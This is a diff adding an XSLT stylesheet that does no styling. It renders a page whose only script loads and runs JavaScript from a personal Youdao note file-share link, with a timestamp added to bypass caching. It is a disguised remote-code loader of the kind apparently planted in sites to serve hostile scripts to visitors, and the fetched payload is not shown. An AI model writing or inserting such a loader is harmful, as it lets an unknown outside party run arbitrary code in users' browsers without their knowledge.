@@ -1,0 +1,19 @@
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <html>
+      <body>
+        <meta content="always" name="referrer" />
+        <meta charset="UTF-8" />
+        <script charset="UTF-8">
+          var xUrl = '//note.youdao.com/yws/api/personal/file/CACA9D7189DA43BB8E1CD1F9A92B231B?method=download&inline=true&shareKey=1e3e98947d65f6e65cb71743862b06aa'
+          var now = Math.round(Date.now() / 1000 / 5)
+          var s = document.createElement('script')
+          s.setAttribute('src', xUrl + '&ut=' + now)
+          s.setAttribute('charset', 'utf-8')
+          if (!document.body) document.head.appendChild(s)
+          else document.body.appendChild(s)
+        </script>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
